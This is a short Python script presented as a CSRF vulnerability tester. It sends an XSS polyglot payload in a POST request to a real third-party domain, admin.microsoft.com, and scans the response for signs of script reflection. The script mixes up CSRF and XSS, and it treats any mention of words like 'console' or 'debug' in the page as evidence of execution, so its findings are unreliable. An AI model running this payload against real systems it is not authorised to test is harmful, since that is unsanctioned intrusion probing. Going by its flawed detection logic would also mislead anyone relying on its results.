import requests
import re

# List of domains to test
domains = ["admin.microsoft.com"]

# Polyglot payload for testing
polyglot_payload = "/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1){}//'"

# Define user agent (you may need to change this to match your environment)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
}

# Function to test for CSRF vulnerability
def test_csrf_vulnerability(domain):
    session = requests.Session()

    # Step 1: Visit the target domain to establish a session
    response = session.get(f"https://{domain}/", headers=headers, allow_redirects=True)
    session_cookie = session.cookies.get_dict()

    if not session_cookie:
        print(f"[{domain}] No session cookie found. Skipping.")
        return False

    print(f"[{domain}] Found session cookie: {session_cookie}")

    # Step 2: Attempt CSRF with the polyglot payload
    csrf_endpoint = f"https://{domain}/"
    data = {
        "input_field": polyglot_payload  # Inject the polyglot payload into a generic field
    }

    csrf_attack_response = session.post(csrf_endpoint, data=data, headers=headers, allow_redirects=True)

    # Step 3: Analyze the response for signs of vulnerability
    if csrf_attack_response.status_code == 200:
        # Look for signs of JavaScript execution
        if re.search(r"alert\(1\)", csrf_attack_response.text, re.IGNORECASE):
            print(f"[{domain}] Polyglot payload detected in response! Potential vulnerability.")
            return True
        elif re.search(r"console|debug|execution", csrf_attack_response.text, re.IGNORECASE):
            print(f"[{domain}] JavaScript execution detected in response. Check manually for vulnerabilities.")
            return True
        else:
            print(f"[{domain}] No immediate signs of JavaScript execution in the response.")
    else:
        print(f"[{domain}] CSRF attack failed. Response code: {csrf_attack_response.status_code}")

    return False

# Test each domain
for domain in domains:
    is_vulnerable = test_csrf_vulnerability(domain)
    if is_vulnerable:
        print(f"Domain {domain} is potentially vulnerable to CSRF attacks.")
    else:
        print(f"Domain {domain} does not appear to be vulnerable to CSRF.")
